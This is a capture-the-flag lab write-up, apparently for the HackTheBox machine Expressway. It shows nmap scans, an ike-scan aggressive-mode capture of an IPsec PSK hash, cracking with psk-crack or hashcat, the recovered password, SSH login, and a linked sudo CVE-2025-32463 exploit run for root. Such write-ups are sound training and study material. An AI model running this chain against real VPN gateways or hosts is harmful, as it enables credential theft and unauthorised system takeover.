### Nmap
```bash
nmap -sS -sV -sC -vv 10.10.11.87

ot shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
- UDP
```bash
nmap -sU -sV -sC --top-ports=20 10.10.11.87 -vv

---OUTPUT---
Nmap scan report for 10.10.11.87
Host is up, received echo-reply ttl 63 (0.017s latency).
Scanned at 2025-12-03 18:46:54 EST for 187s

PORT      STATE         SERVICE      REASON              VERSION
53/udp    closed        domain       port-unreach ttl 63
67/udp    closed        dhcps        port-unreach ttl 63
68/udp    open|filtered dhcpc        no-response
69/udp    open          tftp         script-set          Netkit tftpd or atftpd
| tftp-version: 
|   cpe: 
|     cpe:/a:netkit:netkit
|     cpe:/a:lefebvre:atftpd
|_  p: Netkit tftpd or atftpd
...
...
500/udp   open          isakmp?      udp-response
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
| fingerprint-strings: 
|   IKE_MAIN_MODE: 
|_    "3DUfw
514/udp   closed        syslog       port-unreach ttl 63
520/udp   closed        route        port-unreach ttl 63
631/udp   closed        ipp          port-unreach ttl 63
1434/udp  closed        ms-sql-m     port-unreach ttl 63
1900/udp  closed        upnp         port-unreach ttl 63
4500/udp  open|filtered nat-t-ike    no-response
49152/udp closed        unknown      port-unreach ttl 63
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port500-UDP:V=7.95%I=7%D=12/3%Time=6930CC0D%P=x86_64-pc-linux-gnu%r(IKE
SF:_MAIN_MODE,70,"\0\x11\"3DUfw\x89\xa7\xb3\xfb\xbcG\xc6\xf0\x01\x10\x02\0
SF:\0\0\0\0\0\0\0p\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\
SF:0\x20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x
SF:01\x80\x0b\0\x01\x80\x0c\0\x01\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\0\0\0
SF:\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0")%r(IPSEC_START,
SF:9C,"1'\xfc\xb08\x10\x9e\x89\xe6\xa5\]\xcew\x0c\xf2\xe3\x01\x10\x02\0\0\
SF:0\0\0\0\0\0\x9c\r\0\x004\0\0\0\x01\0\0\0\x01\0\0\0\(\x01\x01\0\x01\0\0\
SF:0\x20\x01\x01\0\0\x80\x01\0\x05\x80\x02\0\x02\x80\x04\0\x02\x80\x03\0\x
SF:03\x80\x0b\0\x01\x80\x0c\x0e\x10\r\0\0\x0c\t\0&\x89\xdf\xd6\xb7\x12\r\0
SF:\0\x14\xaf\xca\xd7\x13h\xa1\xf1\xc9k\x86\x96\xfcwW\x01\0\r\0\0\x18@H\xb
SF:7\xd5n\xbc\xe8\x85%\xe7\xde\x7f\0\xd6\xc2\xd3\x80\0\0\0\0\0\0\x14\x90\x
SF:cb\x80\x91>\xbbin\x08c\x81\xb5\xecB{\x1f");
```
- Netkit and isakmp?
- on first glance with searchsploit there is an interesting RCE exploit:
![[Pasted image 20251203185155.png]]
but it doesnt work

- i check isakmp and see it has something to do with ipsec. and the 500 udp response is related to IKE VPN.
- I can use `ike-scan` to find more info as based from hacktricks: https://angelica.gitbook.io/hacktricks/network-services-pentesting/ipsec-ike-vpn-pentesting

- I bruteforce scan it to find a hash:
```
ike-scan -P -M -A -n fakeID 10.10.11.87

---OUTPUT---
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned
        HDR=(CKY-R=9efbdf8664977c3b)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
87959638cc870bbe4f1aa3bfa7b024dabdf32194bfb308278b91538e2322c55de65c6f48bf7db6a74f3cbb6324f8c9659ca6ceb4b458ffdc82a0d893796f00795e7e1a34f4c841dacd71bf3df07f022fd4dde9cc9785dde6419b2d68852b6a2461fe6cc334d4cf1c79b7d5f962e79b7e91b7b3cf50d9a62b4a82ed409175b430:73c67b3abf5f93038ed166788e424f121f5da1e03d6f381c5f85797e0c6bdc374d5aa73b751431969da173dd624b2fcb3cd6ba5109c113175468196c3d24066944611bfa7bccf98ecda4a0c704eab6c385a036781310faad917417f881d01df99dc14bd78b03cb4f7eeaff2e574b0fae547c91a48785ed916d491567c376387d:9efbdf8664977c3b:52c2afacfa8bab26:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:9fb81832fa1e8ccee88aef925b2120ad60b4ac09:ee846d96d279fefd836026fafbd11e95d18fa842171d679208d0ae22fd3462e2:51816bea902eda78f88b86fbd8dcc7d371dbe5c9
Ending ike-scan 1.9.6: 1 hosts scanned in 0.031 seconds (32.76 hosts/sec).  1 returned handshake; 0 returned notify
```
![[Pasted image 20251203191040.png]]
- can crack with psk-crack or hashcat:
```
psk-crack -d /usr/share/wordlists/rockyou.txt hash

--OR--

hashcat -m 5400 hash /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20251203192136.png]]
- We see user in the brute force scan as `ike` and we cracked the hash to a password `freakingrockstarontheroad`
- Can ssh to target and grab user flag:
![[Pasted image 20251203192313.png]]

```
ssh ike@10.10.11.87
```
![[Pasted image 20251203192336.png]]

- With linpeas I find that sudo version is `1.9.17`
![[Pasted image 20251203193504.png]]

- Searching online I find a bash script exploit which I copy onto target and run it to gain root shell:https://github.com/kh4sh3i/CVE-2025-32463/blob/main/exploit.sh
![[Pasted image 20251203193555.png]]

- I grab root flag:
![[Pasted image 20251203193619.png]]